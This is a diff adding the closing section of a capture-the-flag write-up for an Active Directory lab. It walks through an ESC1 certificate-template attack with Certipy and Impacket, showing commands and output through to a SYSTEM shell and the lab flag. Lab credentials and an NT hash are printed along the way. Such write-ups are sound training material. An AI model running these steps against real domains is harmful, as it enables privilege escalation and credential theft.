@@ -535,3 +535,170 @@ If Certipy finds a vulnerable template (such as a flaw known as ESC1):
     Log In as Administrator: We present this certificate to the domain to authenticate. The network trusts the certificate completely, handing us full Domain Admin (Root) control over every computer in the domain.
 
 Certipy created a text file (20260730145459_Certipy.txt) containing the scan results. The next step is to open that file to see which specific template is vulnerable so we can request our administrator certificate.
+
+
+---
+
+> ESC1 (Certificate exploitation)
+
+> Learn more about this exploitation [here](https://www.hackingarticles.in/ad-certificate-exploitation-esc1/)
+
+```shell
+cat 20260730145459_Certipy.txt
+Certificate Authorities
+  0
+    CA Name                             : thm-LABYRINTH-CA
+    DNS Name                            : labyrinth.thm.local
+    Certificate Subject                 : CN=thm-LABYRINTH-CA, DC=thm, DC=local
+    Certificate Serial Number           : 5225C02DD750EDB340E984BC75F09029
+    Certificate Validity Start          : 2023-05-12 07:26:00+00:00
+    Certificate Validity End            : 2028-05-12 07:35:59+00:00
+    Web Enrollment
+      HTTP
+        Enabled                         : False
+      HTTPS
+        Enabled                         : False
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+    Permissions
+      Owner                             : THM.LOCAL\Administrators
+      Access Rights
+        ManageCa                        : THM.LOCAL\Administrators
+                                          THM.LOCAL\Domain Admins
+                                          THM.LOCAL\Enterprise Admins
+        ManageCertificates              : THM.LOCAL\Administrators
+                                          THM.LOCAL\Domain Admins
+                                          THM.LOCAL\Enterprise Admins
+        Enroll                          : THM.LOCAL\Authenticated Users
+Certificate Templates
+  0
+    Template Name                       : ServerAuth
+    Display Name                        : ServerAuth
+    Certificate Authorities             : thm-LABYRINTH-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Extended Key Usage                  : Client Authentication
+                                          Server Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Schema Version                      : 2
+    Validity Period                     : 1 year
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Template Created                    : 2023-05-12T08:55:40+00:00
+    Template Last Modified              : 2023-05-12T08:55:40+00:00
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : THM.LOCAL\Domain Admins
+                                          THM.LOCAL\Domain Computers
+                                          THM.LOCAL\Enterprise Admins
+                                          THM.LOCAL\Authenticated Users
+      Object Control Permissions
+        Owner                           : THM.LOCAL\Administrator
+        Full Control Principals         : THM.LOCAL\Domain Admins
+                                          THM.LOCAL\Enterprise Admins
+        Write Owner Principals          : THM.LOCAL\Domain Admins
+                                          THM.LOCAL\Enterprise Admins
+        Write Dacl Principals           : THM.LOCAL\Domain Admins
+                                          THM.LOCAL\Enterprise Admins
+        Write Property Enroll           : THM.LOCAL\Domain Admins
+                                          THM.LOCAL\Domain Computers
+                                          THM.LOCAL\Enterprise Admins
+    [+] User Enrollable Principals      : THM.LOCAL\Authenticated Users
+                                          THM.LOCAL\Domain Computers
+    [!] Vulnerabilities
+      ESC1                              : Enrollee supplies subject and template allows client authentication.
+
+```
+
+
+> Now let's request a certificate
+
+```shell
+certipy-ad req -u 'SUSANNA_MCKNIGHT' -p 'CHANGEME2023!' -dc-ip 10.130.181.194 -target labyrinth.thm.local -ca thm-LABYRINTH-CA -template ServerAuth -upn Administrator@thm.local
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Request ID is 25
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'Administrator@thm.local'
+[*] Certificate has no object SID
+[*] Try using -sid to set the object SID or see the wiki for more details
+[*] Saving certificate and private key to 'administrator.pfx'
+[*] Wrote certificate and private key to 'administrator.pfx'
+```
+
+> Administrator hash extraction:
+
+```shell
+certipy-ad auth -pfx administrator.pfx -dc-ip 10.130.181.194
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'Administrator@thm.local'
+[*] Using principal: 'administrator@thm.local'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'administrator.ccache'
+[*] Wrote credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@thm.local': aad3b435b51404eeaad3b435b51404ee:07d677a6cf40925beb80ad6428752322
+```
+
+> Since there was a restriction which prevented me from executing commands via atexec (scheduled tasks), smbexec, wmiexec, nxc smb, and even logging in with rdp and nxc rdp using pass-the-hash, I first first exported the Administrator TGT ccache file using .pfx, then used smbexec to log in as NT AUTHORITY\SYSTEM. 
+```
+┌──(root㉿kali)-[~/thm.local]
+└─# # Obtain the TGT ccache file using your administrator.pfx
+certipy-ad auth -pfx administrator.pfx -dc-ip 10.130.181.194
+
+# Export the generated ccache file to your environment
+export KRB5CCNAME=administrator.ccache
+
+# Execute smbexec using Kerberos (-k) and no password (-no-pass)
+impacket-smbexec -k -no-pass -target-ip 10.130.181.194 administrator@labyrinth.thm.local
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'Administrator@thm.local'
+[*] Using principal: 'administrator@thm.local'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'administrator.ccache'
+File 'administrator.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
+[*] Wrote credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@thm.local': aad3b435b51404eeaad3b435b51404ee:07d677a6cf40925beb80ad6428752322
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[!] Launching semi-interactive shell - Careful what you execute
+C:\Windows\system32> whoami
+nt authority\system
+C:\Windows\system32>dir C:\Users\Administrator\Desktop
+ Volume in drive C has no label.
+ Volume Serial Number is A8A4-C362
+
+ Directory of C:\Users\Administrator\Desktop
+
+05/31/2023  08:18 AM    <DIR>          .
+05/31/2023  08:18 AM    <DIR>          ..
+06/21/2016  03:36 PM               527 EC2 Feedback.website
+06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
+05/31/2023  07:33 AM                29 root.txt
+               3 File(s)          1,110 bytes
+               2 Dir(s)  12,402,700,288 bytes free
+
+C:\Windows\system32>
+C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
+THM{THE_BYPASS_IS_CERTIFIED!}
+```
+
+---
+
+My thoughts: This lab was not actually that hard. All we needed was enumerating everything, which takes time and patience, and it makes it very close to real-world environment I believe. Again, I am not a AD nerd, so I did not specifically enjoy while suffering through some stages, I think doing this pushed me harder to learn new things about AD Exploitation. So I will take it :D
